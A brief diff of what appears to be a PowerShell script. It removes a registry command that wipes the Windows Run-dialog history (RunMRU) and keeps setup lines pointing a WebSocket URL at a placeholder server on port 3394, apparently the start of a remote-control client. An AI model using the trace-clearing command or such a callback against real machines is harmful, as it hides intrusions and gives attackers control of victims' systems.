@@ -1,4 +1,3 @@
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f;
 [Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding(850)
 Try{
 	$URL = 'ws://[your_server]:3394'
